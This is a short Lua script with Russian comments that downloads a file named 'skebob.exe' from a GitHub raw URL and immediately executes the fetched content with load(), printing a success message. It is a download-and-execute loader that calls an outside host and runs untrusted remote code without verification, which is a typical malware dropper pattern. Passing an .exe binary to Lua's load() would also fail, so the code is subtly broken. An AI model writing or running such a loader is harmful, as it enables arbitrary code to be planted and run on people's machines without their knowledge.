local http = require("socket.http")
local ltn12 = require("ltn12")

-- Укажите URL файла для скачивания
local url = "https://github.com/LOL3213312/dsadas/raw/refs/heads/main/skebob.exe"  -- Замените на вашу ссылку

-- Скачиваем содержимое
local response_body = {}
local result, code = http.request{
    url = url,
    sink = ltn12.sink.table(response_body)
}

if result == 1 and code == 200 then
    -- Выполняем скачанный код
    local downloaded_code = table.concat(response_body)
    local func, err = load(downloaded_code)
    if func then
        func()  -- Запускаем
        print("Файл успешно скачан и запущен!")
    else
        print("Ошибка загрузки кода: " .. tostring(err))
    end
else
    print("Ошибка скачивания: " .. tostring(code))
end